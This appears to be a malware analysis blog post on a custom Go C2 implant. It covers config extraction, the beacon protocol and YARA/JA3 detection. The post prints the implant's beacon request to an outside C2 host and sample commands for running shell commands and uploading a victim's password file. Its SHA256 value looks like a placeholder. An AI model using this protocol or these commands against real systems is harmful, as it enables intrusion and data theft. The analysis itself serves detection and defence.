---
title: "Malware Analysis: Dissecting a Custom Go C2 Implant"
description: "Static and dynamic analysis of a custom C2 implant written in Go, including config extraction, protocol reversing, and detection signatures."
pubDate: 2025-09-11
tags: ["malware", "c2", "golang", "reverse-engineering", "detection"]
difficulty: "intermediate"
---

## Sample Overview

| Field | Value |
|---|---|
| SHA256 | `a3f1c2d4e5b6789012345678abcdef01234567890abcdef1234567890abcdef12` |
| File Type | PE32+ executable (Windows x64) |
| Language | Go 1.21.3 (confirmed via `gopclntab`) |
| Size | 8.4 MB (typical for statically linked Go) |
| Packer | None detected; standard Go binary layout |
| First Seen | 2025-08-14 (internal honeypot) |

The binary was recovered from a compromised host after lateral movement from an internet-facing Confluence server. No commercial packer was identified, but the author had stripped the symbol table (`-ldflags="-s -w"`).

---

## Static Analysis

### Initial Strings Examination

Running `strings` against a stripped Go binary yields limited results, but a few hardcoded fragments are visible:

```
/api/v2/update
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/json
X-Request-ID:
AES-256-GCM
```

The User-Agent string matches Chrome 114, suggesting the author is mimicking browser traffic. The `/api/v2/update` path is the beaconing endpoint.

### Symbol Recovery with GoReSym

Because the symbol table was stripped, we use [GoReSym](https://github.com/mandiant/GoReSym) to recover function names from the `gopclntab` section, which Go always embeds regardless of strip flags:

```bash
GoReSym_lin -t -d -p implant.exe > symbols.json
```

Key functions recovered:

- `main.runBeacon` — primary C2 loop
- `main.extractConfig` — decodes embedded config blob
- `main.encryptPayload` / `main.decryptPayload` — AES-GCM wrappers
- `main.collectSysInfo` — host reconnaissance
- `crypto/aes`, `crypto/cipher` — confirms AES usage (standard library)

### XOR Config Extraction

The embedded configuration (C2 IP, sleep interval, jitter, campaign ID) is stored as a XOR-encoded blob in the `.data` section. The key is derived from a hardcoded seed visible in the recovered symbols. The following Python script extracts and decodes the config:

```python
import struct

# Offset and length from static analysis (IDA/Ghidra)
CONFIG_OFFSET = 0x12A4C0
CONFIG_LEN    = 256
XOR_KEY       = b"G0ImplantK3y2025"  # recovered from main.extractConfig

with open("implant.exe", "rb") as f:
    f.seek(CONFIG_OFFSET)
    blob = f.read(CONFIG_LEN)

key_len = len(XOR_KEY)
decoded = bytes(blob[i] ^ XOR_KEY[i % key_len] for i in range(CONFIG_LEN))

# Config layout (little-endian):
# [0:4]   magic       0xDEADBEEF
# [4:8]   sleep_ms    uint32
# [8:12]  jitter_pct  uint32
# [12:28] c2_ip       char[16]  (null-padded)
# [28:44] c2_port     char[8]
# [44:72] campaign_id char[28]

magic, sleep_ms, jitter = struct.unpack_from("<III", decoded, 0)
c2_ip   = decoded[12:28].rstrip(b"\x00").decode()
c2_port = decoded[28:44].rstrip(b"\x00").decode()
campaign = decoded[44:72].rstrip(b"\x00").decode()

print(f"Magic:      0x{magic:08X}")
print(f"Sleep:      {sleep_ms} ms  Jitter: {jitter}%")
print(f"C2:         {c2_ip}:{c2_port}")
print(f"Campaign:   {campaign}")
```

Sample output from the captured sample:

```
Magic:      0xDEADBEEF
Sleep:      45000 ms  Jitter: 20%
C2:         185.220.101.47:443
Campaign:   OP-COASTLINE-Q3-2025
```

---

## Network Protocol Analysis

The implant beacons via HTTPS POST to `/api/v2/update` every 45 seconds (±20% jitter). The request body is JSON-wrapped AES-256-GCM ciphertext:

```
POST /api/v2/update HTTP/1.1
Host: update-cdn.legitlooking[.]com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/json
X-Request-ID: <random UUID>

{
  "client_id": "<sha256(hostname+MAC)>",
  "ts": 1723622400,
  "data": "<base64(AES-GCM(sysinfo_blob))>"
}
```

The C2 domain resolves to a VPS that presents a valid Let's Encrypt certificate for a convincing lookalike domain. The implant pins no certificate, so traffic can be intercepted with a MITM proxy (`mitmproxy`, `Burp`) once DNS is redirected.

Command responses follow the same structure; the `data` field decrypts to a JSON object with a `cmd` key:

```json
{"cmd": "shell", "args": "whoami /all"}
{"cmd": "upload", "path": "C:\\Users\\admin\\Documents\\passwords.xlsx"}
{"cmd": "sleep", "interval": 120000}
```

---

## Detection Opportunities

### JA3/JA4 Fingerprinting

The Go `net/http` TLS stack produces a distinctive JA3 hash because Go negotiates a specific cipher suite order. While an operator can manipulate this with `utls`, this sample uses the default Go TLS client:

- **JA3**: `7dcce5b76c8b17472d024758970a406b` (Go 1.21 default client hello)
- Any HTTPS connection from a non-browser process matching this JA3 on port 443 to a low-reputation IP is a detection candidate.

### YARA Rule

The `gopclntab` section is always present in Go binaries and contains the magic bytes `\xfb\xff\xff\xff` (Go 1.20+) or `\xfa\xff\xff\xff` (Go 1.18-1.19) at offset 0. Combined with the beaconing path, a useful YARA rule is:

```yara
rule Go_C2_Implant_BeaconPath
{
    meta:
        description = "Detects Go C2 implant with /api/v2/update beacon path"
        author      = "a5ucanc security research"
        date        = "2025-09-11"
        tlp         = "WHITE"

    strings:
        // gopclntab magic (Go 1.20+)
        $gopclntab = { FB FF FF FF 00 00 }

        // Beacon path
        $beacon_path = "/api/v2/update" ascii wide

        // Config XOR key (specific to this family)
        $xor_key = "G0ImplantK3y2025" ascii

        // AES-GCM import path present in Go stdlib
        $aes_import = "crypto/cipher" ascii

    condition:
        uint16(0) == 0x5A4D        // PE magic
        and $gopclntab
        and $beacon_path
        and ($xor_key or ($aes_import and #beacon_path >= 1))
}
```

---

## Conclusion

Go-based implants are increasingly common because Go produces self-contained binaries, cross-compiles trivially, and its standard library covers most C2 functionality without external dependencies. The key analyst skills for Go malware are: `gopclntab`-based symbol recovery, locating and decoding embedded config blobs, and fingerprinting the TLS client hello. Detection at the network layer via JA3/JA4 and at the host layer via YARA on `gopclntab` + behavioral indicators provides layered coverage.
